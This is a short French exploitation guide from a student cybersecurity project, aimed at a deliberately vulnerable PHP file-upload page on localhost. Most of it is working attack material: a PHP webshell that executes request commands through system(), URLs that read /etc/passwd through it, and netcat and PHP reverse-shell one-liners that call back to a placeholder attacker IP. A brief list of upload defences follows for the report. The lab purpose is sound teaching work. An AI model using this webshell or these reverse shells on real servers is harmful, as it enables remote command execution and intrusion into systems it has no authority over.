===============================================
   GUIDE D'EXPLOITATION - FILE UPLOAD ATTACK
   SAE Cybersécurité - Alois
===============================================

FAILLES PRÉSENTES SUR LA PAGE attackAlois.php :
- Pas de vérification du type MIME
- Pas de vérification de l'extension
- Pas de renommage du fichier
- Dossier uploads accessible publiquement
- Exécution PHP possible dans uploads

===============================================
1. SIMPLE WEBSHELL
===============================================

Créer un fichier shell.php :

<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>

Uploader via la page Attack Zone, puis accéder :
http://localhost/sae-cyber/uploads/shell.php?cmd=whoami
http://localhost/sae-cyber/uploads/shell.php?cmd=ls -la
http://localhost/sae-cyber/uploads/shell.php?cmd=cat /etc/passwd

===============================================
2. REVERSE SHELL NETCAT
===============================================

Sur la machine attaquante :
nc -lvnp 4444

Via le webshell :
?cmd=nc -e /bin/bash [VOTRE_IP] 4444

Ou avec PHP :
?cmd=php -r '$sock=fsockopen("[VOTRE_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

===============================================
3. MESURES DE PROTECTION (POUR LE RAPPORT)
===============================================

1. Valider le type MIME côté serveur avec finfo_file()
2. Whitelist des extensions autorisées (.jpg, .png, .gif)
3. Renommer les fichiers avec un nom aléatoire
4. Stocker hors du webroot ou désactiver l'exécution PHP
5. Limiter la taille des fichiers uploadés
6. Vérifier le contenu avec getimagesize() pour les images
